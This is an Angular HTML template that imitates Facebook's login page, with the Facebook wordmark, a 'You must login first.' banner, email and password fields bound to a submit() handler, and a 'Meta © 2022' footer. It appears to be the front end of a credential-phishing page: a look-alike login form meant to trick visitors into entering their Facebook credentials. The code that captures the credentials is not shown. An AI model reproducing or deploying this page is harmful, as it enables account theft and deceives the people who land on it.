<p class="w-100 p-2" style="background-color:#fefbe1; color:#b9b272; border-bottom:1px solid #ebdb64">You must login first.</p>
    <div class="w-100 text-center p-1" style="background-color:transparent;">
        <h1 class="font-black text-2xl" style="color: #1c74f4;">facebook</h1>
    </div>
      <!-- <div class="bg-red-600 text-sm text-white p-3">
        Masuk dahulu untuk melanjutkan!
      </div> -->
      
      <form
        class="flex flex-col content-center my-5 mx-auto text-sm"
        style="max-width: 380px"
        ngNativeValidate (ngSubmit)="submit()"
      >
        <input
          type="text"
          class="block p-3 rounded text-sm text-black border mb-2 mx-3"
          style="background-color: #F5F6F7;"
          placeholder="Email address or phone number"
          id="username"
          name="username"
          [(ngModel)]="username"
          required
        />
        <input
          type="password"
          class="block p-3 border rounded text-sm text-black  mx-3"
          style="background-color: #F5F6F7;"
          placeholder="password"
          id="password"
          name="password"
          [(ngModel)]="password"
          required
        />
      
        <button
          class="mx-3 block p-2 mt-3 rounded text-sm text-white font-bold border border-blue-"
          style="background-color: #007BF0;"
          id="login"
          type="submit"
        >
          Login
        </button>

        <a href="#" class="mx-auto mt-3" style="color: #6497C7;">Forgotten password?</a>
      
        <div class="flex items-center">
          <hr width="50%" />
          <span class="text-gray-900 m-3" style="text-style:''">or</span>
          <hr width="50%" />
        </div>
        
        <button type="button" class="p-2  rounded mx-auto font-bold text-white" style="background-color: #00A622">Create New Account</button>
        
        
        <div class="divider my-5"></div>
        
        <div class="flex justify-between center-align flex-wrap text-xs mx-5">
          <ul class="text-center w-1/2" style="list-style: none">
            <li><a href="#" class="text-gray-700">English (UK)</a></li>
            <li><a href="#" class="text-blue-800">አማርኛ</a></li>
            <li><a href="#" class="text-blue-800">Español</a></li>
            <li><a href="#" class="text-blue-800">Français (France)</a></li>
          </ul>
          
          <ul class="text-center w-1/2" style="list-style: none">
            <li><a href="#" class="text-blue-800">Italiano</a></li>
            <li><a href="#" class="text-blue-800">Bahasa Melayu</a></li>
            <li><a href="#" class="text-blue-800">Português (Brasil)
      </a></li>
            <li><a href="#" class="border border-blue-800 bg-white rounded p-1 pt-1" style="width: 20px; height: 20px;"><i class="fas fa-plus text-gray-600"></i></a></li>
          </ul>
        </div>
        
        <footer class="mt-3 w-100 text-center">
          <span class="text-gray-600 text-xs">Meta  © 2022</span>
        </footer>
      </form>
